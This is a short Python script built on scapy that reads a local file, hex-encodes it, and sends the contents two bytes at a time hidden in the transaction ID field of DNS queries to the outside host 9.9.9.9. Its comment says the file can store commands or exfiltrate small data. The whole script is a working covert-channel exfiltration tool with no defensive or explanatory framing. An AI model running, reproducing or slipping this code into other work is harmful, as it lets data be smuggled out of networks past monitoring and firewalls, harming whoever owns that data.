# src_file.txt is the file which can be used to store commands, exfiltrate small data
from scapy.all import *
import binascii
f=open('src_file.txt','rb')
hexdata = binascii.hexlify(f.read())
for i in range(0,len(hexdata),4):
  data=hexdata[i:i+4]
  #print data
  p=IP(dst='9.9.9.9')/UDP(dport=53)/DNS(id=int(data,16),rd=1,qd=DNSQR(qname="abc.com"))
  send(p)